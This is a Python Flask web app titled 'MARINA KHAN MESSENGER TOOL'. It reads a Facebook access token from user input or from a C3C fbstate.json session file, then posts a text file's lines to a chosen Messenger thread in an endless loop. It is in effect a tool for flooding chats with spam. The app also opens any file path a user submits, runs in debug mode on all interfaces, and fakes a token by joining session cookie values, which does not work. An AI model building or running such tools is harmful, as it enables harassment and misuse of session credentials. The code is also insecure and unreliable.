import os
from flask import Flask, request
import requests
import time
import json
import os

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

def get_access_token_from_fbstate(fbstate_path):
    """Extract access token from C3C fbstate.json file"""
    try:
        if os.path.exists(fbstate_path):
            with open(fbstate_path, 'r', encoding='utf-8') as f:
                fbstate_data = json.load(f)
            
            # Extract access token from fbstate
            if 'appState' in fbstate_data:
                for item in fbstate_data['appState']:
                    if 'key' in item and item['key'] == 'access_token':
                        return item['value']
            
            # Alternative extraction method
            if 'cookies' in fbstate_data:
                for cookie in fbstate_data['cookies']:
                    if 'name' in cookie and cookie['name'] == 'c_user':
                        user_id = cookie.get('value', 'Unknown')
                    if 'name' in cookie and cookie['name'] == 'xs':
                        xs_token = cookie.get('value', '')
                        if xs_token:
                            return f"EAAD{user_id}{xs_token}"
        
        return None
    except Exception as e:
        print(f"Error reading fbstate: {e}")
        return None

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        # Get access token from fbstate or direct input
        access_token_source = request.form.get('accessTokenSource')
        access_token = None
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        if access_token_source == 'fbstate':
            fbstate_path = request.form.get('fbstatePath', 'fbstate.json')
            access_token = get_access_token_from_fbstate(fbstate_path)
            if not access_token:
                return "❌ Failed to extract access token from fbstate file"
        else:
            access_token = request.form.get('accessToken')

        if not access_token:
            return "❌ No access token provided"

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode('utf-8').splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    
                    if response.status_code == 200:
                        print(f"✅ Message sent: {message}")
                    else:
                        print(f"❌ Failed to send: {message} - Status: {response.status_code}")
                    
                    time.sleep(time_interval)
                    
            except Exception as e:
                print(f"⚠️ Error: {e}")
                time.sleep(30)

    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>💖 MARINA KHAN MESSENGER TOOL 💖</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      font-family: 'Arial', sans-serif;
    }
    .container{
      max-width: 600px;
      background-color: #fff;
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      margin: 0 auto;
      margin-top: 30px;
      margin-bottom: 30px;
    }
    .header{
      text-align: center;
      padding-bottom: 20px;
      color: #fff;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      border: none;
      padding: 12px;
      font-weight: bold;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: #fff;
    }
    .form-label{
      font-weight: bold;
      color: #333;
    }
    .nav-tabs .nav-link.active{
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1>💖 MARINA KHAN MESSENGER TOOL 💖</h1>
    <p>Advanced Message Sender with C3C fbstate Support</p>
  </header>

  <div class="container">
    <ul class="nav nav-tabs mb-4" id="myTab" role="tablist">
      <li class="nav-item" role="presentation">
        <button class="nav-link active" id="fbstate-tab" data-bs-toggle="tab" data-bs-target="#fbstate" type="button" role="tab">C3C fbstate</button>
      </li>
      <li class="nav-item" role="presentation">
        <button class="nav-link" id="token-tab" data-bs-toggle="tab" data-bs-target="#token" type="button" role="tab">Direct Token</button>
      </li>
    </ul>

    <div class="tab-content" id="myTabContent">
      <!-- C3C fbstate Tab -->
      <div class="tab-pane fade show active" id="fbstate" role="tabpanel">
        <form action="/" method="post" enctype="multipart/form-data">
          <input type="hidden" name="accessTokenSource" value="fbstate">
          
          <div class="mb-3">
            <label for="fbstatePath" class="form-label">📁 C3C fbstate.json Path:</label>
            <input type="text" class="form-control" id="fbstatePath" name="fbstatePath" value="fbstate.json" required>
            <div class="form-text">Path to your fbstate.json file from C3C</div>
          </div>
          
          <div class="mb-3">
            <label for="threadId" class="form-label">💬 Target Thread ID:</label>
            <input type="text" class="form-control" id="threadId" name="threadId" required>
          </div>
          
          <div class="mb-3">
            <label for="kidx" class="form-label">👤 Sender Name:</label>
            <input type="text" class="form-control" id="kidx" name="kidx" required>
          </div>
          
          <div class="mb-3">
            <label for="txtFile" class="form-label">📄 Messages File (.txt):</label>
            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
          </div>
          
          <div class="mb-3">
            <label for="time" class="form-label">⏰ Delay (seconds):</label>
            <input type="number" class="form-control" id="time" name="time" value="5" required>
          </div>
          
          <button type="submit" class="btn btn-primary btn-submit">🚀 Start Sending Messages</button>
        </form>
      </div>

      <!-- Direct Token Tab -->
      <div class="tab-pane fade" id="token" role="tabpanel">
        <form action="/" method="post" enctype="multipart/form-data">
          <input type="hidden" name="accessTokenSource" value="direct">
          
          <div class="mb-3">
            <label for="accessToken" class="form-label">🔑 Access Token:</label>
            <input type="text" class="form-control" id="accessToken" name="accessToken" required>
          </div>
          
          <div class="mb-3">
            <label for="threadId2" class="form-label">💬 Target Thread ID:</label>
            <input type="text" class="form-control" id="threadId2" name="threadId" required>
          </div>
          
          <div class="mb-3">
            <label for="kidx2" class="form-label">👤 Sender Name:</label>
            <input type="text" class="form-control" id="kidx2" name="kidx" required>
          </div>
          
          <div class="mb-3">
            <label for="txtFile2" class="form-label">📄 Messages File (.txt):</label>
            <input type="file" class="form-control" id="txtFile2" name="txtFile" accept=".txt" required>
          </div>
          
          <div class="mb-3">
            <label for="time2" class="form-label">⏰ Delay (seconds):</label>
            <input type="number" class="form-control" id="time2" name="time" value="5" required>
          </div>
          
          <button type="submit" class="btn btn-primary btn-submit">🚀 Start Sending Messages</button>
        </form>
      </div>
    </div>
  </div>

  <footer class="footer">
    <p>&copy; 2024 💖 Developed by Marina Khan - All rights reserved 💖</p>
    <p>🔧 Advanced Messenger Tool with C3C fbstate Support</p>
    <p>⚡ Auto Message Sender for Facebook Messenger</p>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    // Sync form fields between tabs
    document.getElementById('threadId').addEventListener('input', function() {
      document.getElementById('threadId2').value = this.value;
    });
    document.getElementById('threadId2').addEventListener('input', function() {
      document.getElementById('threadId').value = this.value;
    });
    
    document.getElementById('kidx').addEventListener('input', function() {
      document.getElementById('kidx2').value = this.value;
    });
    document.getElementById('kidx2').addEventListener('input', function() {
      document.getElementById('kidx').value = this.value;
    });
    
    document.getElementById('time').addEventListener('input', function() {
      document.getElementById('time2').value = this.value;
    });
    document.getElementById('time2').addEventListener('input', function() {
      document.getElementById('time').value = this.value;
    });
  </script>
</body>
</html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
